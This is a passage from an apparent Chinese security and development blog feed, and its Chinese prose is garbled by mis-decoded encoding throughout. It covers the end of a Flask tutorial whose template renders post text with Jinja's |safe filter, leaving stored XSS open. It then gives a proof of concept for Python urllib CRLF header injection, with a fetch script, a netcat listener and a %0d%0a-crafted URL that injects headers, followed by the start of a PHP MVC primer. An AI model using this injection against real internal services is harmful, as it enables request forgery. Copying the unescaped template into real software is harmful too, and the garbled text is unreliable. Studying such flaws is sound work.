title="æ¨¡æ¿"></a>æ¨¡æ¿</h2><p>ç°åœ¨æˆ‘ä»¬åº”è¯¥å¼€å§‹ç¼–å†™æ¨¡æ¿ã€‚å¦‚æœæˆ‘ä»¬ç°åœ¨è¯·æ±‚ URLs ï¼Œå°†ä¼šå¾—åˆ°ä¸€ä¸ª Flask æ— æ³•æ‰¾åˆ°æ¨¡æ¿çš„å¼‚å¸¸ã€‚æ¨¡æ¿ä½¿ç”¨ Jinja2 è¯­è¨€ä»¥åŠé»˜è®¤å¼€å¯è‡ªåŠ¨è½¬ä¹‰ã€‚è¿™å°±æ„å‘³ç€é™¤éä½ ä½¿ç”¨Markupæ ‡è®°æˆ–åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨|safeè¿‡æ»¤å™¨ï¼Œå¦åˆ™ Jinja2 ä¼šç¡®ä¿ç‰¹æ®Šå­—ç¬¦æ¯”å¦‚&lt;æˆ–&gt;è¢«è½¬ä¹‰æˆç­‰ä»·çš„XMLå®ä½“ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨æ¨¡æ¿ç»§æ‰¿ä½¿å¾—åœ¨ç½‘ç«™çš„æ‰€æœ‰é¡µé¢ä¸­é‡ç”¨å¸ƒå±€æˆä¸ºå¯èƒ½ã€‚</p><p>æˆ‘ä»¬çš„æ¨¡æ¿ç»Ÿä¸€å­˜æ”¾åœ¨Code/flaskr/templatesæ–‡ä»¶å¤¹ä¸­ã€‚</p><h3 id="layout-html"><a href="#layout-html" class="headerlink" title="layout.html"></a>layout.html</h3><p>è¿™ä¸ªæ¨¡æ¿åŒ…å« HTML ä¸»ä½“ç»“æ„ï¼Œæ ‡é¢˜å’Œä¸€ä¸ªç™»å½•é“¾æ¥ï¼ˆæˆ–è€…å½“ç”¨æˆ·å·²ç™»å½•åˆ™æä¾›æ³¨é”€ï¼‰ã€‚å¦‚æœæœ‰é—ªç°ä¿¡æ¯çš„è¯å®ƒä¹Ÿå°†æ˜¾ç¤ºé—ªç°ä¿¡æ¯ã€‚&#123;% block body %&#125; å—èƒ½å¤Ÿè¢«å­æ¨¡æ¿ä¸­çš„åŒæ ·åå­—(body)çš„å—æ›¿ä»£ã€‚</p><p>sessionå­—å…¸åœ¨æ¨¡æ¿ä¸­åŒæ ·å¯ç”¨çš„ï¼Œä½ èƒ½ç”¨å®ƒæ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•ã€‚æ³¨æ„åœ¨ Jinja ä¸­ä½ å¯ä»¥è®¿é—®ä¸å­˜åœ¨çš„å¯¹è±¡/å­—å…¸å±æ€§æˆ–æˆå‘˜ï¼Œå¦‚åŒä¸‹é¢çš„ä»£ç ï¼Œå³ä¾¿ logged_in é”®ä¸å­˜åœ¨ï¼Œä»ç„¶å¯ä»¥æ­£å¸¸å·¥ä½œã€‚</p><p>åœ¨ flaskr/templates ç›®å½•ä¸‹æ–°å»º layout.html æ–‡ä»¶å¹¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">stylesheet</span> <span class="attr">type</span>=<span class="string">text/css</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('static', filename='style.css') &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">metanav</span>&gt;</span></span><br><span class="line">  &amp;#123;% if not session.logged_in %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span>&gt;</span>log in<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  &amp;#123;% else %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('logout') &amp;#125;&amp;#125;"</span>&gt;</span>log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &amp;#123;% for message in get_flashed_messages() %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span>&amp;#123;&amp;#123; message &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &amp;#123;% endfor %&amp;#125;</span><br><span class="line">  &amp;#123;% block body %&amp;#125;&amp;#123;% endblock %&amp;#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="show-entries-html"><a href="#show-entries-html" class="headerlink" title="show_entries.html"></a>show_entries.html</h3><p>è¿™ä¸ªæ¨¡æ¿ç»§æ‰¿äº†ä¸Šé¢çš„layout.htmlæ¨¡æ¿ç”¨æ¥æ˜¾ç¤ºä¿¡æ¯ã€‚æ³¨æ„foréå†äº†æ‰€æœ‰æˆ‘ä»¬ç”¨render_template()å‡½æ•°ä¼ å…¥çš„ä¿¡æ¯ã€‚æˆ‘ä»¬åŒæ ·å‘Šè¯‰è¡¨å•æäº¤åˆ°add_entryå‡½æ•°é€šè¿‡ä½¿ç”¨ HTTP çš„POSTæ–¹æ³•ã€‚</p><p>åœ¨ flaskr/templates ç›®å½•ä¸‹æ–°å»º show_entries.html æ–‡ä»¶å¹¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "layout.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  &amp;#123;% if session.logged_in %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('add_entry') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">class</span>=<span class="string">add-entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Title:</span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">size</span>=<span class="string">30</span> <span class="attr">name</span>=<span class="string">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Text:</span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">text</span> <span class="attr">rows</span>=<span class="string">5</span> <span class="attr">cols</span>=<span class="string">40</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Share</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">entries</span>&gt;</span></span><br><span class="line">  &amp;#123;% for entry in entries %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&amp;#123;&amp;#123; entry.title &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>&amp;#123;&amp;#123; entry.text|safe &amp;#125;&amp;#125;</span><br><span class="line">  &amp;#123;% else %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Unbelievable.  No entries here so far<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">  &amp;#123;% endfor %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><h3 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h3><p>æœ€åæ˜¯ç™»å½•æ¨¡æ¿ï¼ŒåŸºæœ¬ä¸Šåªæ˜¾ç¤ºä¸€ä¸ªå…è®¸ç”¨æˆ·ç™»å½•çš„è¡¨å•ã€‚</p><p>åœ¨ flaskr/templates ç›®å½•ä¸‹æ–°å»º login.html æ–‡ä»¶å¹¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "layout.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &amp;#123;% if error %&amp;#125;<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &amp;#123;&amp;#123; error &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><h3 id="æ·»åŠ æ ·å¼"><a href="#æ·»åŠ æ ·å¼" class="headerlink" title="æ·»åŠ æ ·å¼"></a>æ·»åŠ æ ·å¼</h3><p>ç°åœ¨å…¶å®ƒä¸€åˆ‡éƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯æ—¶å€™ç»™åº”ç”¨æ·»åŠ äº›æ ·å¼ã€‚</p><p>åœ¨ Code/flaskr/static ç›®å½•ä¸‹æ–°å»º style.css æ ·å¼æ–‡ä»¶å¹¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>            &amp;<span class="selector-id">#123</span>; <span class="attribute">font-family</span>: sans-serif; <span class="attribute">background</span>: <span class="number">#eee</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>       &amp;<span class="selector-id">#123</span>; <span class="attribute">color</span>: <span class="number">#377BA8</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">font-family</span>: <span class="string">'Georgia'</span>, serif; <span class="attribute">margin</span>: <span class="number">0</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h1</span>              &amp;<span class="selector-id">#123</span>; <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#eee</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h2</span>              &amp;<span class="selector-id">#123</span>; <span class="attribute">font-size</span>: <span class="number">1.2em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.page</span>           &amp;<span class="selector-id">#123</span>; <span class="attribute">margin</span>: <span class="number">2em</span> auto; <span class="attribute">width</span>: <span class="number">35em</span>; <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">                  <span class="attribute">padding</span>: <span class="number">0.8em</span>; <span class="attribute">background</span>: white; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span>        &amp;<span class="selector-id">#123</span>; <span class="attribute">list-style</span>: none; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">0</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span>     &amp;<span class="selector-id">#123</span>; <span class="attribute">margin</span>: <span class="number">0.8em</span> <span class="number">1.2em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span> <span class="selector-tag">h2</span>  &amp;<span class="selector-id">#123</span>; <span class="attribute">margin-left</span>: -<span class="number">1em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.add-entry</span>      &amp;<span class="selector-id">#123</span>; <span class="attribute">font-size</span>: <span class="number">0.9em</span>; <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.add-entry</span> <span class="selector-tag">dl</span>   &amp;<span class="selector-id">#123</span>; <span class="attribute">font-weight</span>: bold; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.metanav</span>        &amp;<span class="selector-id">#123</span>; <span class="attribute">text-align</span>: right; <span class="attribute">font-size</span>: <span class="number">0.8em</span>; <span class="attribute">padding</span>: <span class="number">0.3em</span>;</span><br><span class="line">                  <span class="attribute">margin-bottom</span>: <span class="number">1em</span>; <span class="attribute">background</span>: <span class="number">#fafafa</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.flash</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">background</span>: <span class="number">#CEE5F5</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>;</span><br><span class="line">                  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#AACBE2</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.error</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">background</span>: <span class="number">#F0D6D6</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>; &amp;<span class="selector-id">#125</span>;</span><br></pre></td></tr></table></figure></p><h2 id="è¿è¡Œåº”ç”¨"><a href="#è¿è¡Œåº”ç”¨" class="headerlink" title="è¿è¡Œåº”ç”¨"></a>è¿è¡Œåº”ç”¨</h2><p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†ç®€å•åšå®¢åº”ç”¨çš„ä»£ç ç¼–å†™ï¼Œç°åœ¨åœ¨ç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è¿è¡Œç¨‹åºï¼šï¼ˆåœ¨è¿™ä¹‹å‰æ³¨æ„è¦é…ç½®æ•°æ®åº“ï¼Œå¦‚æœæ²¡æœ‰é…ç½®å¯ä»¥å‚è€ƒä¸Šä¸€ä¸ªå®éªŒçš„æ­¥éª¤ï¼‰<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> flaskr.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></p><p>è®¿é—®é¦–é¡µ <a href="http://127.0.0.1:5000" target="_blank" rel="noopener">http://127.0.0.1:5000</a> ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1d1eyb1a4j30sn09kgmk.jpg" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python urllib HTTPå¤´æ³¨å…¥æ¼æ´</title>
      <link href="/2019/03/22/Python-urllib-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/22/Python-urllib-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>Pythonçš„urllibåº“ï¼ˆåœ¨Python2ä¸­ä¸º urllib2 ï¼Œåœ¨Python3ä¸­ä¸º urllib ï¼‰æœ‰ä¸€ä¸ªHTTPåè®®ä¸‹çš„åè®®æµæ³¨å…¥æ¼æ´ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶Pythonä»£ç è®¿é—®ä»»æ„URLæˆ–è€…è®©Pythonä»£ç è®¿é—®ä¸€ä¸ªæ¶æ„çš„web servrï¼Œé‚£è¿™ä¸ªæ¼æ´å¯èƒ½ä¼šå±å®³å†…ç½‘æœåŠ¡å®‰å…¨ã€‚<br>HTTPåè®®è§£æhostçš„æ—¶å€™å¯ä»¥æ¥å—ç™¾åˆ†å·ç¼–ç çš„å€¼ï¼Œè§£ç ï¼Œç„¶ååŒ…å«åœ¨HTTPæ•°æ®æµé‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰è¿›ä¸€æ­¥çš„éªŒè¯æˆ–è€…ç¼–ç ï¼Œè¿™å°±å¯ä»¥æ³¨å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚<br>æ³¨:ç°åœ¨çš„pythonç‰ˆæœ¬å·²ç»ä¿®å¤äº†<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!python</span></span><br><span class="line"><span class="meta">#!/usr/bin/env python3  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request   </span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure></p><p>è¿™æ®µä»£ç åªæ˜¯ä»å‘½ä»¤è¡Œå‚æ•°æ¥æ”¶ä¸€ä¸ªURLï¼Œç„¶åå»è®¿é—®å®ƒã€‚ä¸ºäº†æŸ¥çœ‹ urllib è·å–çš„HTTPå¤´ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªncæ¥ç›‘å¬ç«¯å£ã€‚<br>åœ¨å‘½ä»¤è¡Œè¾“å…¥<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -<span class="selector-tag">p</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure></p><p>é‡æ–°æ‰“å¼€ä¸€ä¸ªçª—å£è¿è¡Œpyæ–‡ä»¶<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch3<span class="selector-class">.py</span> http:<span class="comment">//127.0.0.1:12345/style</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bi52sbu3j30qk07cmxh.jpg" alt=""></p><p>å¯ä»¥çœ‹åˆ°,åœ¨serverå¾—åˆ°äº†httpè¯·æ±‚å¤´<br>ç„¶åæˆ‘ä»¬ä½¿ç”¨æ¶æ„æ„é€ çš„åœ°å€<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch<span class="number">3</span>.py http://<span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aX-injected:<span class="symbol">%20</span>header<span class="symbol">%0</span>d<span class="symbol">%0</span>ax-leftover:<span class="symbol">%20</span>:<span class="number">12345</span>/foo</span><br></pre></td></tr></table></figure></p><p>è¿”å›çš„HTTPå¤´å°±æ˜¯<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line"><span class="builtin-name">GET</span> /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p><h1 id="æ”»å‡»é¢"><a href="#æ”»å‡»é¢" class="headerlink" title="æ”»å‡»é¢"></a>æ”»å‡»é¢</h1><h2 id="HTTPå¤´æ³¨å…¥å’Œè¯·æ±‚ä¼ªé€ "><a href="#HTTPå¤´æ³¨å…¥å’Œè¯·æ±‚ä¼ªé€ " class="headerlink" title="HTTPå¤´æ³¨å…¥å’Œè¯·æ±‚ä¼ªé€ "></a>HTTPå¤´æ³¨å…¥å’Œè¯·æ±‚ä¼ªé€ </h2><h2 id="æ”»å‡»memcached"><a href="#æ”»å‡»memcached" class="headerlink" title="æ”»å‡»memcached"></a>æ”»å‡»memcached</h2><h2 id="æ”»å‡»Redis"><a href="#æ”»å‡»Redis" class="headerlink" title="æ”»å‡»Redis"></a>æ”»å‡»Redis</h2><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">https://strcpy.me/index.php/archives/749/</a><br><a href="http://www.anquan.us/static/drops/papers-16905.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-16905.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/106</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP MVCå¼€å‘æ¡†æ¶å­¦ä¹ </title>
      <link href="/2019/03/21/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/21/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é€šè¿‡å­¦ä¹ MVCèƒ½å¤Ÿæ›´æ·±çš„äº†è§£ä¸€äº›mvcæ¡†æ¶</p><h1 id="MVC-æ€æƒ³"><a href="#MVC-æ€æƒ³" class="headerlink" title="MVC æ€æƒ³"></a>MVC æ€æƒ³</h1><p>MVCæ˜¯ä¸€ä¸ªè®¾è®¡æ¨¡å¼ï¼Œå®ƒå¼ºåˆ¶æ€§çš„ä½¿åº”ç”¨ç¨‹åºçš„è¾“å…¥ã€å¤„ç†å’Œè¾“å‡ºåˆ†å¼€ã€‚ä½¿ç”¨MVCåº”ç”¨ç¨‹åºè¢«åˆ†æˆä¸‰ä¸ªæ ¸å¿ƒéƒ¨ä»¶ï¼šæ¨¡å‹ï¼ˆMï¼‰ã€è§†å›¾ï¼ˆVï¼‰ã€æ§åˆ¶å™¨ï¼ˆCï¼‰ï¼Œå®ƒä»¬å„è‡ªå¤„ç†è‡ªå·±çš„ä»»åŠ¡ã€‚</p><p>è§†å›¾ï¼šè§†å›¾æ˜¯ç”¨æˆ·çœ‹åˆ°å¹¶ä¸ä¹‹äº¤äº’çš„ç•Œé¢ã€‚å¯¹è€å¼çš„Webåº”ç”¨ç¨‹åºæ¥è¯´ï¼Œè§†å›¾å°±æ˜¯ç”±HTMLå…ƒç´ ç»„æˆçš„ç•Œé¢ï¼Œåœ¨æ–°å¼çš„Webåº”ç”¨ç¨‹åºä¸­ï¼ŒHTMLä¾æ—§åœ¨è§†å›¾ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ï¼Œä½†ä¸€äº›æ–°çš„æŠ€æœ¯å·²å±‚å‡ºä¸ç©·ï¼Œå®ƒä»¬åŒ…æ‹¬Adobe Flashå’Œè±¡XHTMLï¼ŒXML/XSLï¼ŒWMLç­‰ä¸€äº›æ ‡è¯†è¯­è¨€å’ŒWeb servicesã€‚å¦‚ä½•å¤„ç†åº”ç”¨ç¨‹åºçš„ç•Œé¢å˜å¾—è¶Šæ¥è¶Šæœ‰æŒ‘æˆ˜æ€§ã€‚MVCä¸€ä¸ªå¤§çš„å¥½å¤„æ˜¯å®ƒèƒ½ä¸ºä½ çš„åº”ç”¨ç¨‹åºå¤„ç†å¾ˆå¤šä¸åŒçš„è§†å›¾ã€‚åœ¨è§†å›¾ä¸­å…¶å®æ²¡æœ‰çœŸæ­£çš„å¤„ç†å‘ç”Ÿï¼Œä¸ç®¡è¿™äº›æ•°æ®æ˜¯è”æœºå­˜å‚¨çš„è¿˜æ˜¯ä¸€ä¸ªé›‡å‘˜åˆ—è¡¨ï¼Œä½œä¸ºè§†å›¾æ¥è®²ï¼Œå®ƒåªæ˜¯ä½œä¸ºä¸€ç§è¾“å‡ºæ•°æ®å¹¶å…è®¸ç”¨æˆ·æ“çºµçš„æ–¹å¼ã€‚</p><p>æ¨¡å‹ï¼šæ¨¡å‹è¡¨ç¤ºä¼ä¸šæ•°æ®å’Œä¸šåŠ¡è§„åˆ™ã€‚åœ¨MVCçš„ä¸‰ä¸ªéƒ¨ä»¶ä¸­ï¼Œæ¨¡å‹æ‹¥æœ‰æœ€å¤šçš„å¤„ç†ä»»åŠ¡ã€‚ä¾‹å¦‚å®ƒå¯èƒ½ç”¨è±¡EJBså’ŒColdFusion Componentsè¿™æ 